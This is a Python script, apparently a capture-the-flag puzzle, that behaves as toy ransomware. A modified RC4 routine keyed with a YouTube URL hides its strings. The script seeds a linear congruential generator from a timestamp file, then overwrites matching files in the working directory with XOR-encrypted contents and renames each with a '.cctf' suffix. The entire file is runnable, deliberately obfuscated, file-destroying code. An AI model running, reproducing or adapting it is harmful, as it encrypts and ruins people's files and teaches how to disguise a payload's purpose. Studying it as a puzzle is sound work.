import os
import sys
import time

ct = int(time.time())

def get_pizza(e):
    with open(e, ''.join(RC4([0xf0, 0x0d], [ '\x16', '(']))) as f:
        f.writelines([str(ct) + "\n"])
    with open(e, ''.join(RC4([0xf0, 0x0d], ['\x05']))) as f:
        lines = f.readlines()
    return [int(l.strip()) for l in lines]

def yum(a):
    b = a
    return b

def why(b):
    return (6364136223846793005*b + 1 ) % (2**64)

def main():
    k = [0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x79, 0x6f, 0x75, 0x74, 0x75, 0x62, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x77, 0x61, 0x74, 0x63, 0x68, 0x3f, 0x76, 0x3d, 0x64, 0x51, 0x77, 0x34, 0x77, 0x39, 0x57, 0x67, 0x58, 0x63, 0x51]
    print("".join(RC4(k, ['1', '\x08', '\x02', 'Q', '\x9c', '\x07', '7', '\x19', '±', 'É', 'd', '\x1d', '?', 's', '«', 'r', 'ì', '¾', '\r', '\x00', '\x9d', 'å', '·', 'a', '}', 'Ø', 'n', '\x0f', '\x14', '/', 'Í', 'Ç', '3', '6', 'z', 'k', '\x8f', '\x0c', '\x92', '\x1a', '\x9b', '3', 'â', 'D', 'µ', '"', 'Ý', '$', '¾', 'Ç', '\x87', 'r', 'ø', '@', '¼', '>', 'µ', 'Ê', '+'])))
    print("".join(RC4(k, [';', '\x08', '\x1a', '\x14', '\x9f', '\x0e', '0', '\x03', 'ö', '\x90', '|', '\r', '#', "'", 'í', 'l', 'ò', '´', '\x10', 'G', 'Ñ', 'ª', 'ú', '*', '-', '\x97', 'J', '\x13', 'M', 'h', 'Ä', '\x8b', '3', 'c', '`', 'o', 'Û', '^', 'ÿ', ')', '³', '\x17', 'Æ', '\x7f', 'Ô'])))
    
    files = [f for f in os.listdir(''.join(RC4(k, 'L'))) if os.path.isfile(f) and f.endswith("".join(RC4(k, ['L', '\x13', '\x17', '@']))) and f != sys.argv[0] and f != "".join(RC4(k, ['L', '\t', '\x00', '@', '·', '\x1b', '6', '\x12', '\x89', '\x9d', 'z', '\x15', '4']))]
    s = get_pizza("".join(RC4(k, ['L', '\t', '\x00', '@', '·', '\x1b', '6', '\x12', '\x89', '\x9d', 'z', '\x15', '4'])))
    se = s[-1]
    for f in files:
        s = why(se) 
        with open(f, "".join(RC4(k, ['\x10', 'L']))) as file:
            si = file.read()
            si = yum(si)
            perm = ""
        with open(f, "".join(RC4(k, ['\x15']))) as file:
            for c in range(0, len(si)):
                perm += chr(ord(si[c]) ^ (s & 0xff))
                s = why(s) 
            file.write(perm)
        nf = f"{f}.cctf"
        os.rename(f, nf)
    return

def KSA(S, k):
    for i in range(255):
        S[i] = i

    j = 0
    for i in range(255):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S, a):
    i = 0
    j = 0
    heh = []
    for ch in a:
        heh.append(ord(ch))
    for c, _ in enumerate(heh):
        i = (i + 1) % 256
        j = (j + 1) % 256
        S[i], S[j] = S[j], S[i]
        b = S[(S[i] + S[j]) % 256]
        heh[c] ^= b
    for i, ch in enumerate(heh):
        heh[i] = chr(ch)
    return heh

def RC4(a, pt):
    v = [None] * 256
    v = KSA(v, a)
    r = PRGA(v, pt)
    return r

main()
